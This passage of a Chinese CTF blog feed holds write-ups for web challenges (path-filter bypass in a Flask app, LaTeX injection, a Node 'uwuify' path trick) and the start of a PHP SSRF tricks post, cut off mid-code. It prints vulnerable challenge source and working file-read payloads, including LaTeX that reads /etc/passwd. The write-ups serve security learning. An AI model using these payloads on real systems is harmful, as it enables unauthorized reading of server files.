        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> n <span class="token operator">*</span> factorial<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> RecursionError<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token number">1</span>

<span class="token keyword">def</span> <span class="token function">filter_path</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># print(path)</span>
    path <span class="token operator">=</span> path<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> filter_path<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
    <span class="token keyword">except</span> RecursionError<span class="token punctuation">:</span>
        <span class="token comment"># remove root / from path if it exists</span>
        <span class="token keyword">if</span> path<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">:</span>
            path <span class="token operator">=</span> path<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>
        <span class="token keyword">return</span> path

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    safe_theme <span class="token operator">=</span> filter_path<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"theme"</span><span class="token punctuation">,</span> <span class="token string">"themes/theme1.css"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>safe_theme<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
    theme <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">calculate_factorial</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    safe_theme <span class="token operator">=</span> filter_path<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"theme"</span><span class="token punctuation">,</span> <span class="token string">"themes/theme1.css"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>safe_theme<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
    theme <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> num <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
            error <span class="token operator">=</span> <span class="token string">"Invalid input: Please enter a non-negative integer."</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>
        result <span class="token operator">=</span> factorial<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> result<span class="token operator">=</span>result<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        error <span class="token operator">=</span> <span class="token string">"Invalid input: Please enter a non-negative integer."</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    sys<span class="token punctuation">.</span>setrecursionlimit<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>dockerfile文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FROM python:3.10-slim-buster

RUN pip3 <span class="token function">install</span> flask
COPY flag.txt /

WORKDIR /app
COPY app/* /app/
copy app/templates/* /app/templates/
copy app/themes/* /app/themes/

EXPOSE <span class="token number">5000</span>

ENTRYPOINT <span class="token punctuation">[</span><span class="token string">"python3"</span>, <span class="token string">"app.py"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以得知flag文件名为flag.txt，<code>path = path.replace(&quot;../&quot;, &quot;&quot;)</code>这里把<code>../</code>也给过滤了<br>绕过的话我试了试发现<code>//flag.txt和..///flag.txt</code>都可以绕过<br><img src="https://img-blog.csdnimg.cn/0f66898d59574faf8b13befd85b71cee.png" alt="1"></p>
<h3 id="latek"><a href="#latek" class="headerlink" title="latek"></a>latek</h3><blockquote>
<p>bryanguo（与ctf无关）一直说它的发音是latek，而不是像手套材料那样的乳胶。不管怎样，我制作了这个简单的应用程序，这样他就不再支付背页的费用了。<br>注意：标志仅在&#x2F;flag.txt</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/3730939722a3412fb00a4fd24179ee9c.png" alt="1"><br>这个就是一个在线的LaTex编辑器，将编辑的内容以pdf的文件形式展现出来，查看了一篇<a href="https://salmonsec.com/cheatsheets/exploitation/latex_injection">国外大佬的博客</a>，介绍了LaTex注入的一些语法。</p>
<p>输入</p>
<blockquote>
<p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\input{&#x2F;flag.txt}<br>\end{document} </p>
</blockquote>
<p>会发现给出了一部分flag<br><img src="https://img-blog.csdnimg.cn/fbb8040055734064a248c8036fd23c2c.png" alt="1"><br>那么另一部分怎么得到呢？借鉴了wp看到他使用了批处理模式</p>
<blockquote>
<p>\batchmode：在 LaTeX 中，该命令会抑制所有终端和日志文件输出，这意味着编译过程不会在终端上产生任何消息或提示。它通常用于以批处理模式运行 LaTeX，在处理文档时不会中断用户输入或反馈。当您想要自动化文档生成过程时，这会很有帮助</p>
</blockquote>
<blockquote>
<p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\batchmode<br>\input{&#x2F;flag.txt}<br>\end{document} </p>
</blockquote>
<blockquote>
<p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\usepackage{verbatim}<br>\verbatiminput{&#x2F;etc&#x2F;passwd}<br>\end{document} </p>
</blockquote>
<blockquote>
<p>在LaTeX文档中，\usepackage{verbatim}用于导入名为”verbatim”的宏包，它提供了在文档中插入原始文本（verbatim文本）的功能。当你希望在文档中原样显示一段代码、配置文件或其他任何文本时，通常会使用该宏包。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/af8f210f009944a088f99b6809eb579f.png" alt="1"><br>参考链接<br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection">链接</a><br><a href="https://salmonsec.com/cheatsheets/exploitation/latex_injection">链接</a></p>
<h3 id="uwuctf"><a href="#uwuctf" class="headerlink" title="uwuctf"></a>uwuctf</h3><blockquote>
<p>这个 rust uwuifier 速度太快了，我确信只要我能欺骗我的节点，它就会扩展到月球。uwuifier 即服务专业版何时订阅？<br>更新：zip 几乎与服务器相同，除了我们删除了challenge.yml 和flag.txt</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/ef485e2862cb42e8883d69eae95ea0a5.png" alt="1"><br>这里就是访问上面的文件当我利用LFI漏洞时发现<code>../</code>被过滤了。后续测试了很多遍也没有思路。最后看见别人的wp结合源码<br>这是index.js文件</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span>config<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"dotenv"</span><span class="token punctuation">;</span>
<span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> fs <span class="token keyword">from</span> <span class="token string">"fs"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> path <span class="token keyword">from</span> <span class="token string">"path"</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">&#123;</span>quote<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"shell-quote"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span>exec<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"child_process"</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> textsDir <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"public"</span><span class="token punctuation">,</span> <span class="token string">"texts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> uwuifierPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"uwuify"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> express <span class="token keyword">from</span> <span class="token string">"express"</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> morgan <span class="token keyword">from</span> <span class="token string">"morgan"</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'trust proxy'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'loopback'</span><span class="token punctuation">,</span> <span class="token string">'linklocal'</span><span class="token punctuation">,</span> <span class="token string">'uniquelocal'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">morgan</span><span class="token punctuation">(</span><span class="token string">"combined"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">"public/index.html"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">root</span><span class="token operator">:</span> process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// bug fix</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/uwuify"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"no hacking >:("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">let</span> cmd <span class="token operator">=</span> <span class="token string">"cat "</span> <span class="token operator">+</span> <span class="token function">quote</span><span class="token punctuation">(</span><span class="token punctuation">[</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" | "</span> <span class="token operator">+</span> uwuifierPath<span class="token punctuation">;</span>
    <span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
      <span class="token literal-property property">cwd</span><span class="token operator">:</span> textsDir
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>stdout <span class="token operator">+</span> stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"no src provided"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/dir"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> output <span class="token operator">=</span> <span class="token string">"texts avali to uwuify: "</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> files <span class="token operator">=</span> <span class="token keyword">await</span> fs<span class="token punctuation">.</span>promises<span class="token punctuation">.</span><span class="token function">readdir</span><span class="token punctuation">(</span>textsDir<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> file <span class="token keyword">of</span> files<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        output <span class="token operator">+=</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> file<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    output <span class="token operator">+=</span> <span class="token string">"\r\n\r\nUse /uwuify?src=&lt;text file name> to uwuify a text file!"</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">||</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Server Up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这是dockerfile文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FROM node:16
COPY ./* /home/node/app/
COPY ./public/* /home/node/app/public/
COPY ./public/texts/* /home/node/app/public/texts/
WORKDIR /home/node/app
RUN <span class="token function">npm</span> <span class="token function">install</span>
ENV <span class="token assign-left variable">PORT</span><span class="token operator">=</span><span class="token number">8082</span>
RUN <span class="token function">chown</span> <span class="token parameter variable">-R</span> node:node /home/node/app
<span class="token environment constant">USER</span> <span class="token function">node</span>
CMD <span class="token punctuation">[</span><span class="token string">"bash"</span>, <span class="token string">"launch.sh"</span><span class="token punctuation">]</span>
EXPOSE <span class="token number">8082</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到实际上flag.txt就在&#x2F;home&#x2F;node&#x2F;app&#x2F;flag.txt<br>读取当前目录使用<code>~</code>，其实<code>https://uwuasaservice.amt.rs/uwuify?src=~</code>也就是<code>cat ~</code>，这个时候爆出路径</p>
<blockquote>
<p>cat: &#x2F;home&#x2F;node: Is a directory</p>
</blockquote>
<p>那么下面就直接读取flag文件<br><a href="https://uwuasaservice.amt.rs/uwuify?src=~/app/flag.txt">https://uwuasaservice.amt.rs/uwuify?src=~/app/flag.txt</a></p>
<blockquote>
<p>amateuwsctf{so_wmao_this_fwag_is_gonna_be_a_wot_wongew_than_most_fwag_othew_fwags_good_wuck_have_fun_decoding_it_end_of_fwag}</p>
</blockquote>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>涉及SSRF的一些tricks</title>
    <url>/2023/07/20/%E6%B6%89%E5%8F%8ASSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="trick1"><a href="#trick1" class="headerlink" title="trick1"></a>trick1</h2><blockquote>
<p>php遇到不认识的协议就会当目录处理</p>
</blockquote>
<p>参考题目<a href="https://ctf.show/challenges#web2_%E6%95%85%E4%BA%BA%E5%BF%83-482">ctfshow月饼杯故人心</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">7</span> <span class="token keyword">and</span> <span class="token variable">$a</span><span class="token operator">!=</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token variable">$a</span><span class="token operator">**</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">==</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">==</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$host</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow\.com$/'</span><span class="token punctuation">,</span><span class="token variable">$host</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'差点点就成功了！'</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'please give me url!!!'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>     
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'想一想md5碰撞原理吧?!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'第一个都过不了还想要flag呀?!'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p><code>if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123;</code><br>a是数字，a的长度小于7，a不等于0，a的平方是0</p>
</blockquote>
<p>由于长度限制，这个时候利用到科学计数法找一个比较小的数例如<strong>1e-234</strong></p>
<blockquote>
<p><code>$d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c)));</code><br>有个robots.txt文件</p>
<p><img src="https://img-blog.csdnimg.cn/e78bc410ddb4452f9a789038554b8fc3.png" alt="1"><br>只要保证一个数前面加上0e之后再md2仍然是0e开头的数字即可</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">999999</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0e'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'024452'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string single-quoted-string">'0e'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'$i = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
